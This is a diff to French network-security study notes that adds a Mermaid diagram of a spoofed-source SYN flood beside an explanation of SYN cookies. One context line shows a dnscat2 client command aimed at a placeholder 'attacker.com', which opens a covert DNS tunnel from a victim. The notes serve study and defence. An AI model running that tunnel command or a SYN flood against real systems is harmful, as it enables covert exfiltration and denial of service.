@@ -230,6 +230,24 @@ dnscat2 attacker.com          # Client (sur la victime)
 
 **Mécanisme** : Envoyer massivement des paquets SYN avec IP source spoofée. Le serveur alloue des ressources (half-open connections) pour chaque SYN reçu, sans jamais recevoir l'ACK final. Épuisement des ressources → déni de service.
 
+```mermaid
+sequenceDiagram
+    participant C as Client légitime
+    participant S as Serveur
+    participant A as Attaquant
+    C->>S: SYN
+    S-->>C: SYN-ACK
+    C->>S: ACK, connexion établie
+    Note over A,S: avec des adresses source usurpées
+    A->>S: SYN depuis 203.0.113.7
+    A->>S: SYN depuis 198.51.100.42
+    A->>S: SYN depuis …
+    S-->>A: SYN-ACK vers des adresses qui ne répondent pas
+    Note over S: file des connexions à moitié ouvertes pleine
+    C->>S: SYN
+    Note over C,S: plus de place, le client légitime est refusé
+```
+
 > [!important] Pourquoi les SYN Cookies marchent sans rien stocker
 > Au lieu d'allouer une structure mémoire pour chaque SYN reçu, le serveur encode l'état de la connexion directement dans le numéro de séquence du SYN-ACK (via un hash de l'IP, du port et d'un secret). Il ne garde aucune trace tant que l'ACK final n'arrive pas — un attaquant qui ne complète jamais le handshake ne consomme donc aucune ressource, contrairement à l'attaque classique.
 
